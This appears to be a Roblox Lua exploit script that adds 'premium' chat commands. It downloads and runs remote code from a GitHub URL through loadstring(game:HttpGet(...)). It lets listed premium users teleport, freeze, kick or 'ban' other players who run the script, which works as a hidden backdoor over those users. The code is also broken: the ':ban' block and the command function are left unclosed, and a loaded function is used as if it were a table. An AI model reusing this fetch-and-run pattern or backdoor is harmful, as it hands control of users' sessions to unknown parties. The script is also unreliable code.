local player = game.Players.LocalPlayer
local isamod = false
local prefix = ":"
local mods = loadstring(game:HttpGet("https://raw.githubusercontent.com/sygzxW/FlameX/main/Premium"))

if table.find(mods,player.UserId) then
	isamod = true
	game.StarterGui:SetCore("SendNotification",{
		Title = "Premium detected!";
		Text = "Premium commands enabled! Thanks for the purchase.";
		Duration = 5;
	})
end

local function cmds(msg,plr)
	if isamod == false or table.find(mods,plr) then
		mod = game.Players:GetPlayerByUserId(plr)
		isamod = table.find(mods,player.UserId)
		if msg == ":bring" then
			if not isamod then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mod.Character.HumanoidRootPart.CFrame
			end
		end
		if msg == ":freeze" then
			if not isamod then
				player.Character.HumanoidRootPart.Anchored = true
			end
		end
		if msg == ":unfreeze" then
			if not isamod then
				player.Character.HumanoidRootPart.Anchored = false
			end
		end
		if msg == ":wal" then
            if not isamod then
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet"))
                end
            end
        end
        if msg == ":dewal" then
            if not isamod then
                if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
                end
            end
        end
        if msg == ":kick" then
            if not isamod then
                player:Kick("You've been kicked by a premium user.")
            end
        end
        if msg == ":ban" then
            if not isamod then
                player:Kick("User BANNED")

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(mods,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(mods,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)
